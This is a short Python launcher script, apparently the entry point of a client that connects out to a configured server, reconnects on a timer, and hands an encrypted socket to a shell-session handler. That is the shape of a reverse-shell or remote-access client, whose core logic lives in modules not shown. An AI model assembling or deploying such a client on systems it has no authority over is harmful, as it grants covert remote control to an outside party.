import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from client.core.config import load_config
from client.core.connection import connect_and_run
from client.core.dispatcher import handle_session
from client.platform import get_platform


def main():
    config = load_config()
    platform = get_platform()

    def shell_callback(sock, encryption):
        handle_session(sock, platform, encryption)

    try:
        connect_and_run(
            config['server_host'],
            config['server_port'],
            shell_callback,
            config['reconnect_interval'],
            config['encryption'],
        )
    except KeyboardInterrupt:
        sys.exit()


if __name__ == '__main__':
    main()
